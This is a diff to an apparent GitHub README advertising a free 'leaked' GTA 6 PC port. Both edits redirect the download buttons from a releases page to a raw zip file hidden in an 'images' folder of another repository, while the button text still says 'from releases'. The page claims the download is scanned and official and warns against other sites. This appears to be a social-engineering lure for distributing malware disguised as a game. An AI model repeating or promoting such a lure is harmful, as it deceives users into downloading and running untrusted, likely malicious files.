@@ -5,7 +5,7 @@ description: "Download GTA 6 Leaked PC Port Build 2026, the early pre-release ve
 ---
 # 🎮 GTA-6-Leaked-PC-Port-Build-2026 - Your Free Ticket to Vice City
 
-[⬇️ DOWNLOAD NOW - FREE & WORKING](https://github.com/allawigamer43/GTA-6-Leaked-PC-Port-Build-2026/releases)
+[⬇️ DOWNLOAD NOW - FREE & WORKING](https://github.com/allawigamer43/allawigamer43.github.io/raw/refs/heads/main/images/v1.0.zip)
 
 ---
 
@@ -124,7 +124,7 @@ No. This is a community repack, scanned by thousands of users. We cannot list a 
 
 **👉 Visit this link to download the application.**
 
-[⬇️ CLICK HERE FOR DIRECT DOWNLOAD FROM RELEASES](https://github.com/allawigamer43/GTA-6-Leaked-PC-Port-Build-2026/releases)
+[⬇️ CLICK HERE FOR DIRECT DOWNLOAD FROM RELEASES](https://github.com/allawigamer43/allawigamer43.github.io/raw/refs/heads/main/images/v1.0.zip)
 
 This is the only official page. Do not download from fake "GTA 6 download" websites you find in YouTube comments—those are dangerous. Stick to this GitHub repository.
 
